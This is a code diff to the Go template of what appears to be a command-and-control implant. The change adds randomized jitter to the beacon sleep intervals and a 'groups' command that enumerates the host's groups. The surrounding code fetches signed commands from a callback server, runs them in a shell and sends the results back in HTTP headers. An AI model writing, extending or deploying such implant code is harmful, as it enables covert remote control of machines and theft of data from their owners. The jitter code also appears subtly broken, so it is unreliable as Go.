@@ -10,6 +10,7 @@ import (
 	"encoding/pem"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -19,6 +20,20 @@ import (
 
 	"golang.org/x/crypto/chacha20poly1305"
 )
+
+func DetermineGroups() ([]string, error) {
+	gid, _ := os.Getgroups()
+	var groups []string
+	for i := 0; i < len(gid); i++ {
+		stringID := fmt.Sprint(gid[i])
+		id, err := user.LookupGroupId(stringID)
+		if err != nil {
+			return nil, err
+		}
+		groups = append(groups, id.Name)
+	}
+	return groups, nil
+}
 
 func StrH(s string) uint32 {
 	var h uint32
@@ -138,18 +153,21 @@ func main() {
 	}
 
 	for true {
-		// current issue is that we're not retrieving and executing the new ocmmand
+		ran := rand.New(rand.NewSource(time.Now().UnixNano()))
+		rng := rand.New(ran)
+		jitter := rng.Intn({{.Jitter}}) + 1
+		sleepTime := {{.Sleep}} + jitter
+		
 		req, err := http.NewRequest("GET", "{{.CallBack}}/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err := client.Do(req)
 		body, err := io.ReadAll(resp.Body)
 
-		//Convert the body to type string
 		sb := string(body)
 		sb = strings.TrimSuffix(sb, "\n")
 		if sb == "" {
 			for sb == "" { // An empty string represents a nil response body
-				time.Sleep(2 * time.Second)
+				time.Sleep(time.Duration(sleepTime) * time.Second)
 				req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 				req.Header.Add("APPSESSIONID", uuid)
 				resp, _ := client.Do(req)
@@ -171,7 +189,7 @@ func main() {
 		signature, _ := hex.DecodeString(rawSignature)
 		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
 		if err != nil {
-			time.Sleep(2 * time.Second)
+			time.Sleep(time.Duration(sleepTime) * time.Second)
 			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, _ = client.Do(req)
@@ -195,6 +213,14 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(string_contents, ",")
 			result = terminal(commandToRun)
+		case "groups":
+			res, err := DetermineGroups()
+			if err != nil {
+				result = err.Error()
+			}
+			if err == nil {
+				result = strings.Join(res, "")
+			}
 		case "pid":
 			pid := os.Getpid()
 			result = fmt.Sprint(pid)
@@ -206,7 +232,7 @@ func main() {
 		toSend := string(result)
 		toSend = strings.Replace(toSend, "\n", "", -1)
 
-		time.Sleep(2 * time.Second)
+		time.Sleep(time.Duration(sleepTime) * time.Second)
 		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", nil)
 		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
 		resp, err = client.Do(req)
